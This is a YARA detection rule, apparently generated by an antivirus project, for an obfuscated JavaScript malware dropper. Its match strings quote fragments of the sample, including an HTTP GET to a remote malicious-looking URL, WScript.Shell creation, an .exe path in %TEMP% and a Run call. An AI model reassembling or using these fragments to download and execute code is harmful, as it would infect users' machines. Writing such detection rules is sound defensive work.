rule sig_20160401_18521b492763e78066f58f2d12e803df {
  meta:
    description = "datamaliciousorder - file 20160401_18521b492763e78066f58f2d12e803df.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "71ec2f35fdc48c020a27a93d44af34fe59c98c270d2511b9b38a628a864b8a49"

  strings:
    $s1  = "AyZj[RhEoa](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "function UgKpb(NvBpi, BfVni){YrUm = YrUm * 1; return NvBpi - BfVni;};" fullword ascii
    $s3  = "var EgqMko = function TtEw() {return WScript[JloXhx](\"WScript\"+\".Shell\");}(), GsCbz = 11;" fullword ascii
    $s4  = "if (AyZj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WzZg(){return YwyFf + \"\";};" fullword ascii
    $s6  = "function WcxXe() {return EgqMko[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8yEKft0nq.ex\" + \"e\";};" fullword ascii
    $s7  = "function RkQp() {return ((UctOeg == true) && (UctOeg == KuTw)) ? 1 : YrUm;};" fullword ascii
    $s8  = "return UgKpb(FtSzf, SgxQfc);" fullword ascii
    $s9  = "function EqQa()" fullword ascii
    $s10 = "}while (ZcpEml);" fullword ascii
    $s11 = "var DbPj = false;" fullword ascii
    $s12 = "var KuTw = false;" fullword ascii
    $s13 = "var IbtPi = new this[\"Date\"]();" fullword ascii
    $s14 = "function QgOoy(JdhBxx) {var HbWl = (1, 2, 3, 4, 5, JdhBxx); return HbWl;};" fullword ascii
    $s15 = "var UctOeg = false;" fullword ascii
    $s16 = "function ZdUl(PoZyc){EgqMko[\"R\"+\"un\"](PoZyc, YrUm, YrUm);};" fullword ascii
    $s17 = "function VmsNtq(){return JloXhx;};" fullword ascii
    $s18 = "KuTw = true; " fullword ascii
    $s19 = "UctOeg = true; " fullword ascii
    $s20 = "function EiOi(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}